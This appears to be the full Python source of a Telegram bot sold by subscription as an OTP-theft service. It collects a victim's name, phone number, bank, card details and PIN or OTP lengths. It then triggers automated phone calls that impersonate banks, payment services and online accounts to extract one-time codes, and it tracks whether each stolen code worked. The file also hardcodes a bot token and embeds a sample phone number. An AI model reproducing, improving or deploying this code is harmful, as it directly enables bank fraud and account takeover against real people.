from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler
import requests

url = "http://10.0.0.107/"
token = "5239249129:AAH6l7CBMzJ1pQWGYsTrPO5fVLYUziKbLTY"
section, bankName, bankNumber, bankatmLength, bank, bankfinalCall, cardName, cardNumber, cardatmLength, cardType, cardFinalCall = range(11)

v_name, v_number, v_bank, v_type, otpln, atmln, v_numberr = "", "", "", "", "", "", ""

def verify(username):
    with open('users.txt', 'r') as f:
        users = str(f.read()).split()
    if username in users:
        return True
    else:
        return False

def start(update, context):
    if verify(update.message.from_user['username']):
        update.message.reply_text(
    f'''
    Hello {update.message.from_user['username']}

    Reply with your choice:

    1. /bank
    2. /card
    3. /pay
    4. /account
    5. /cardotp

    Request will expire in 2 minutes
    '''
    )
        return section
    
    else:
        update.message.reply_text("Purchase  Subscription from @Tera_username_daalde_idhar")

def add(update, context):
    if int(update.message.from_user['id']) == 1092158040 or int(update.message.from_user['id']) == 1951961202:
        msg = str(update.message.text).split()
        with open('users.txt', 'a') as f:
            f.write(msg[1]+"\n")

        update.message.reply_text(f"{msg[1]} Allowed!")
    else:
        update.message.reply_text("Baap ko chodna mt sikha")

def delete(update, context):
    if int(update.message.from_user['id']) == 1092158040 or int(update.message.from_user['id']) == 1951961202:
        msg = str(update.message.text).split()
        with open('users.txt', 'r') as f:
            content = f.read()
            content = content.replace(msg[1]+"\n", '')

        with open('users.txt', 'w') as f:
            f.write(content)
            update.message.reply_text(f"@{msg[1]} Removed Successfully!")
    else:
        update.message.reply_text("Baap ko chodna mt sikha")

def bankFunc(update, context):
    update.message.reply_text(
'''
Bank Selected.
Reply with Victim Name:

For Ex: David
''')
    return bankName

def cardFunc(update, context):
    update.message.reply_text(
'''
Card Selected.
Reply with Victim Name:

For Ex: David
''')
    return cardName
card_name = ""
def cardNameVictim(update, context):
    global v_name
    v_name = update.message.text
    update.message.reply_text(f'''
Name: {v_name}

Reply with Victim's Mobile Number in International Format.

Ex: 14057653333''')
    return cardNumber

# v_numberr = ""
def cardNumberVictim(update, context):
    global v_numberr
    v_numberr = update.message.text
    update.message.reply_text(f'''
Name: {v_name}
Number: {v_numberr}

Reply with Length of ATM Pin.
Ex: 4, 5, 6, 7
    ''')   
    return cardatmLength

def cardatmLengthVictim(update, context):
    global atmln
    atmln = update.message.text
    update.message.reply_text(f'''
Name: {v_name}
Number: {v_numberr}
ATM Pin Length: {atmln}

Reply with Card Type.
Ex: Credit, Debit.
    ''')    
    return cardType

def cardTypeVictim(update, context):
    global v_type
    v_type = update.message.text
    print(v_numberr)
    update.message.reply_text(f'''
Name: {v_name}
Number: {v_numberr}
ATM Pin Length: {atmln}
Card Type: {v_type}

Reply with Bank Name.
Ex: chase, wells fargo, city''')
    return cardFinalCall

def createCallCard(update, context):
    global v_bank
    v_bank = update.message.text
    global v_numberr
    print(v_numberr)
    r = requests.get(f"{url}/create-call/card?chat_id={update.message.from_user['id']}&victim={v_numberr}&bank={v_bank}&name={v_name}&card={v_type}")
    update.message.reply_text("Call Initiated...")
    return 21

def payFunc(update, context):
    update.message.reply_text(
'''
Pay Selected.
Reply with Victim Name:

For Ex: David
''')
    return 11

payName = ""
def payStart(update, context):
    global payName
    payName = update.message.text
    update.message.reply_text(f'''
Name: {payName}

Reply with Victim's Mobile Number in International Format.

Ex: 14057653333''')
    return 12

payNumber = ""
def payNum(update, context):
    global payNumber
    payNumber = update.message.text
    update.message.reply_text(f'''
Name: {payName}
Victim's Mobile Number: {payNumber}

Reply with Pay Name.

Ex: Apple, Google,Samsung etc''')
    return 13

payAccName = ""
def payacc(update, context):
    global payAccName
    payAccName = update.message.text
    update.message.reply_text(f'''
Name: {payName}
Victim's Mobile Number: {payNumber}
Pay Name: {payAccName}

Reply with Length of OTP.

Ex: 4, 5, 6, 7 etc''')
    return 14

payOtp = ""
def payOtpHandler(update, context):
    global payOtp
    payOtp = update.message.text
    update.message.reply_text(f'''
Name: {payName}
Victim's Mobile Number: {payNumber}
Pay Name: {payAccName}
OTP Length: {payOtp}

Reply with Length of Card Pin.

Ex: 4, 5, 6, 7 etc''')
    return 15

payCardPin = ""
def payCard(update, context):
    global payCardPin
    payCardPin = update.message.text
    "http://localhost:5000/create-call/pay?victim=919519874704&name=shaurya&bank=apple&digits=6&atmDigits=4"
    r = requests.get(f"{url}/create-call/pay?victim={payNumber}&name={payName}&bank={payAccName}&digits={payOtp}&atmDigits={payCardPin}&chat_id={update.message.from_user['id']}")  
    update.message.reply_text("Call Initiated...")
    update.message.reply_text("After getting OTP, Please reply '/true' or '/false' if OTP is Correct or Incorrect.")
    return 23

def error(update, context):
    update.message.reply_text("Something Went Wrong!")
    return ConversationHandler.END

def cancel(update, context):
    update.message.reply_text("Operation Cancelled!")
    return ConversationHandler.END

def nameFunc(update, context):
    global v_name
    v_name = update.message.text
    update.message.reply_text(f'''
Name: {v_name}

Reply with Victim's Mobile Number in International Format.

Ex: 14057653333''')
    return bankNumber

def otpHandler(update, context):
    global v_number
    v_number = update.message.text
    update.message.reply_text(f'''
Name: {v_name}
Number: {v_number}

Reply with Length of OTP.
Ex: 4, 5, 6, 7
    ''')
    return bankatmLength

def atmHandler(update, context):
    global otpln
    otpln = update.message.text
    update.message.reply_text(f'''
Name: {v_name}
Number: {v_number}
OTP Length: {otpln}

Reply with Length of ATM Pin.
Ex: 4, 5, 6, 7''')
    return bank

def bankHandler(update, context):
    global atmln
    atmln = update.message.text
    update.message.reply_text(f'''
Name: {v_name}
Number: {v_number}
OTP Length: {otpln}
ATM Pin Length: {atmln}

Reply with Bank Name.
Ex: chase, wells fargo, city''')
    return bankfinalCall

def createCall(update, context):
    global v_bank
    v_bank = update.message.text
    r = requests.get(f"{url}/create-call/bank?bank={v_bank}&victim={v_number}&digits={otpln}&atmDigits={atmln}&chat_id={update.message.from_user['id']}&name={v_name}")
    update.message.reply_text("Call Initiated...")
    update.message.reply_text("After getting OTP, Please reply '/true' or '/false' if OTP is Correct or Incorrect.")
    return 21

def account(update, context):
    update.message.reply_text(
'''
Pay Selected.
Reply with Victim Name:

For Ex: David
''')
    return 16
    
accountName = ""
def account2(update, context):
    global accountName 
    accountName = update.message.text
    update.message.reply_text(f'''
Name: {accountName}

Reply with Victim's Mobile Number in International Format.

Ex: 14057653333''')
    return 17

accountNumber = ""
def account3(update, context):
    global accountNumber
    accountNumber = update.message.text
    update.message.reply_text(f'''
Name: {accountName}
Victim's Mobile Number: {accountNumber}

Reply with Account Name.

Ex: Google, Yahoo, Instagram, Coinbase 
    ''')
    return 18

accountChoice = ""
def account4(update, context):
    global accountChoice
    accountChoice = update.message.text
    update.message.reply_text(f'''
Name: {accountName}
Victim's Mobile Number: {accountNumber}
Account Name: {accountChoice}

Reply with OTP Length.

Ex: 4, 5, 6, 7''')
    return 19

accountotplength = ""
def account5(update, context):
    global accountotplength
    accountotplength = update.message.text
    update.message.reply_text(f'''
Name: {accountName}
Victim's Mobile Number: {accountNumber}
Account Name Name: {accountChoice}
OTP Length: {accountotplength}

Reply with Method.

Ex: S-M-S, Email, Gmail''')
    return 20

accountMethod = ""
def account6(update, context):
    global accountMethod
    accountMethod = update.message.text
    r = requests.get(f"{url}/create-call/account?victim={accountNumber}&name={accountName}&method={accountMethod}&account={accountChoice}&digits={accountotplength}&chat_id={update.message.from_user['id']}")
    update.message.reply_text("Call Initiated...")
    update.message.reply_text("After getting OTP, Please reply '/true' or '/false' if OTP is Correct or Incorrect.")
    return 22

def checkPayOTP(update, context):
    if str(update.message.text) == "/true":
        r = requests.get(f"{url}/pay/conf?conf=True")
        update.message.reply_text("Yay, OTP Founded.")
        # update.message.reply_text(r.json())
        return ConversationHandler.END
    elif str(update.message.text) == "/false":
        r = requests.get(f"{url}/pay/conf?conf=False")
        update.message.reply_text("Sorry, We are feeling bad.")
        # update.message.reply_text(r.json())
        return 23
    else:
        update.message.reply_text("We didnt get you.\nor Press /cancel to Terminate the Process.")
        return 23

def checkBankOTP(update, context):
    if str(update.message.text) == "/true":
        r = requests.get(f"{url}/bank/conf?conf=True")
        update.message.reply_text("Yay, OTP Founded.")
        # update.message.reply_text(r.json())
        return ConversationHandler.END
    elif str(update.message.text) == "/false":
        r = requests.get(f"{url}/bank/conf?conf=False")
        update.message.reply_text("Sorry, We are feeling bad.")
        # update.message.reply_text(r.json())
        return 21
    else:
        update.message.reply_text("We didnt get you.\nor Press /cancel to Terminate the Process.")
        return 21
def checkAccountOTP(update, context):
    if str(update.message.text) == "/true":
        r = requests.get(f"{url}/account/conf?conf=True")
        update.message.reply_text("Yay, OTP Founded.")
        # update.message.reply_text(r.json())
        return ConversationHandler.END
    elif str(update.message.text) == "/false":
        r = requests.get(f"{url}/account/conf?conf=False")
        update.message.reply_text("Sorry, We are feeling bad.")
        # update.message.reply_text(r.json())
        return 22
    else:
        update.message.reply_text("We didnt get you.\nor Press /cancel to Terminate the Process.")
        return 22



def cardotp(update, context):
    update.message.reply_text('''
Card OTP Selected.
Reply with Victim Name:

For Ex: David
    ''')
    return 24

cardotpname = ""
def cardotp2(update, context):
    global cardotpname
    cardotpname = update.message.text
    update.message.reply_text(f'''
Name: {cardotpname}

Reply with Victim's Mobile Number in International Format.

Ex: 14057653333
    ''')
    return 25

cardotpnumber = ""
def cardotp3(update, context):
    global cardotpnumber
    cardotpnumber = update.message.text
    update.message.reply_text(f'''
Name: {cardotpname}
Number: {cardotpnumber}

Reply with Bank Name.
Ex: chase, wells fargo, city''')
    return 26


cardotpbank = ""
def cardotp4(update, context):
    global cardotpbank
    cardotpbank = update.message.text
    update.message.reply_text(f'''
Name: {cardotpname}
Number: {cardotpnumber}
Bank: {cardotpbank}

Reply with Amount.
Ex: 600-dollars, 259 pounds, 11000-rupees''')
    return 27

cardotpamount = ""
def cardotp5(update, context):
    global cardotpamount
    cardotpamount = update.message.text
    update.message.reply_text(f'''
Name: {cardotpname}
Number: {cardotpnumber}
Bank: {cardotpbank}
Amount: {cardotpamount}

Reply with Card's Last 4 Digits of Victim.
Ex: 4184, 8663''')
    return 28

cardotpend = ""
def cardotp6(update, context):
    global cardotpend
    cardotpend = update.message.text
    update.message.reply_text(f'''
Name: {cardotpname}
Number: {cardotpnumber}
Bank: {cardotpbank}
Amount: {cardotpamount}
Card Ending: {cardotpend}

Reply with Card Type.
Ex: Visa, Mastercard, Discover''')
    return 29

cardotptype = ""
def cardotp7(update, context):
    global cardotptype
    cardotptype = update.message.text
    update.message.reply_text(f'''
Name: {cardotpname}
Number: {cardotpnumber}
Bank: {cardotpbank}
Amount: {cardotpamount}
Card Ending: {cardotpend}
Card Type: {cardotptype}

Reply with Website Name.
Ex: Amazon, E-Bay, Flipkart''')
    return 30
cardotpsite = ""
def cardotp8(update, context):
    global cardotpsite
    cardotpsite = update.message.text
    update.message.reply_text(f'''
Name: {cardotpname}
Number: {cardotpnumber}
Bank: {cardotpbank}
Amount: {cardotpamount}
Card Ending: {cardotpend}
Card Type: {cardotptype}
Website:  {cardotpsite}

Reply with OTP Length.

Ex: 4, 5, 6, 7''')
    return 31

def cardotp9(update, context):
    # http://127.0.0.1/create-call/cardotp?
    r = requests.get(f"{url}/create-call/cardotp?name={cardotpname}&amount={cardotpamount}&bank={cardotpbank}&chat_id={update.message.from_user['id']}&type={cardotptype}&site={cardotpsite}&victim={cardotpnumber}&digits={update.message.text}&end={cardotpend}")
    update.message.reply_text("Call Initiated...")
    update.message.reply_text("After getting OTP, Please reply '/true' or '/false' if OTP is Correct or Incorrect.")
    return 32

def checkCardOTP(update, context):
    if str(update.message.text) == "/true":
        r = requests.get(f"{url}/cardotp/conf?conf=True")
        update.message.reply_text("Yay, OTP Founded.")
        # update.message.reply_text(r.json())
        return ConversationHandler.END
    elif str(update.message.text) == "/false":
        r = requests.get(f"{url}/cardotp/conf?conf=False")
        update.message.reply_text("Sorry, We are feeling bad.")
        # update.message.reply_text(r.json())
        return 32
    else:
        update.message.reply_text("We didnt get you.\nor Press /cancel to Terminate the Process.")
        return 32

def main():
    updater = Updater(token, use_context=True)
    dp = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            0: [CommandHandler('cancel', cancel), CommandHandler('bank', bankFunc), CommandHandler('card', cardFunc), CommandHandler('pay', payFunc), CommandHandler('account', account), CommandHandler('cardotp', cardotp), MessageHandler(Filters.text, error)],
            1: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, nameFunc)],
            2: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, otpHandler)],
            3: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, atmHandler)],
            4: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, bankHandler)],
            5: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, createCall)],
            6: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardNameVictim)],
            7: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardNumberVictim)],
            8: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardatmLengthVictim)],
            9: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardTypeVictim)], 
            10: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, createCallCard)],
            11: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, payStart)],
            12: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, payNum)],
            13: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, payacc)],
            14: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, payOtpHandler)],
            15: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, payCard)],
            16: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, account2)],
            17: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, account3)],
            18: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, account4)],
            19: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, account5)],
            20: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, account6)],
            21: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, checkBankOTP)],
            22: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, checkAccountOTP)],
            23: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, checkPayOTP)],
            24: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardotp2)],
            25: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardotp3)],
            26: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardotp4)],
            27: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardotp5)],
            28: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardotp6)],
            29: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardotp7)],
            30: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardotp8)],
            31: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, cardotp9)],
            32: [CommandHandler('cancel', cancel), MessageHandler(Filters.text, checkCardOTP)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    dp.add_handler(conv_handler)
    dp.add_handler(CommandHandler('delete', delete))
    dp.add_handler(CommandHandler('add', add))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main() 
